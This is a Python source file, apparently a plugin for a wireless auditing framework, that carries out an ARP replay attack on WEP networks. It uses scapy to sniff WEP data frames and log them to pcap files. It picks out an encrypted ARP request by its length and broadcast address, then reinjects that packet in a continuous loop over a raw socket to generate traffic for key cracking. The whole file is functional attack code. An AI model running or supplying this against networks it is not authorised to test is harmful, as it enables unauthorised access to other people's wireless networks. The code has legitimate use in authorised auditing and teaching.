# -*- coding: utf-8 -*-
"""
This plugin will launch a full arp replay attack on a WEP network
"""
import os, traceback
from plugin import AirScannerPlugin, AirInjectorPlugin
from scapy.all import sniff, sendp, Dot11, Dot11WEP, conf
from threading import Thread, Lock
from scapy.utils import PcapWriter


class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):

	def __init__(self):
		super(ARPReplayer, self).__init__("arpreplayer")
		self.arp_packet = None
		self.replay_thread = None
		self.packet_handling_lock = Lock()
		self.packet_logger = None
		self.sniffing_interface = self.config["sniffing_interface"]
		self.destination_folder = self.config["wep_log"]
		self.network_bssid 		= self.config["network_bssid"].lower()
		try:
			self.notification_divisor 	= int(self.config["notification_divisor"])
		except:
			self.notification_divisor 	= 2000

		self.n_captured_data_packets = 0
		self.n_arp_packets_sent = 0
		self.injection_running = False
		self.injection_working = False

		# Logging
		self._nlogs = self._get_log_count()

	def _get_log_count(self):
		# Get the number of existing log files
		if os.path.exists(self.destination_folder):
			return len(filter(lambda x: x.startswith("wepdata_log"), os.listdir(self.destination_folder)))
		else:
			os.mkdir(self.destination_folder)
			return 0

	def pre_scanning(self):
		self.packet_logger = PcapWriter(self.destination_folder + "wepdata_log{n}.cap".format(n = self._nlogs), 
										append=True, sync=True)

	def handle_packet(self, packet):
		# Identify WEP packet
		if Dot11WEP in packet:
			# Check for ARP packet if not found before
			if self.arp_packet is None:
				packet[Dot11].show
				# Identify if ARP packet by length and destination and if they are broadcast.
				if 	len(packet[Dot11WEP].wepdata) == 36 and 		\
					packet[Dot11].addr1 == self.network_bssid and	\
					packet[Dot11].addr3 == "ff:ff:ff:ff:ff:ff":

					self.arp_packet = packet
					self.injection_working = True
					self.replay_thread = Thread( target = self.arp_replay )
					self.replay_thread.start()
					print "Found a ARP request packet, trying replay attack."

			# Log WEP Data packets...
			self.packet_logger.write(packet)
			self.n_captured_data_packets += 1
			if self.n_captured_data_packets % self.notification_divisor == 0 and self.n_captured_data_packets > 0:
				print "Captured {} wep data packets so far...".format(self.n_captured_data_packets)

			# Evaluate if injection is working
			if self.injection_working:
				if 	self.n_arp_packets_sent > (self.n_captured_data_packets+1) * 5 and \
					self.n_arp_packets_sent > 100:

					self.injection_working = False
					self.n_arp_packets_sent = 0
					print "ARP replay was not working. Looking for new ARP packet."
					self.replay_thread.join()


	def arp_replay(self):
		if self.arp_packet is None:
			print "No ARP packet to try replay attack."
			return

		# Sppeds up scapy packet sending which is very slow.
		s = conf.L2socket(iface=self.sniffing_interface)
		self.injection_running = True
		while self.injection_working:
			try:
				s.send(self.arp_packet)
				self.n_arp_packets_sent += 1
			except: pass # No buffer space available.. skip and keep sending

		print "Stopped replay attack from last ARP packet."
		self.injection_running = False
		self.arp_packet = None
		self.n_arp_packets_sent = 0

	def post_scanning(self):
		self.injection_working = False




		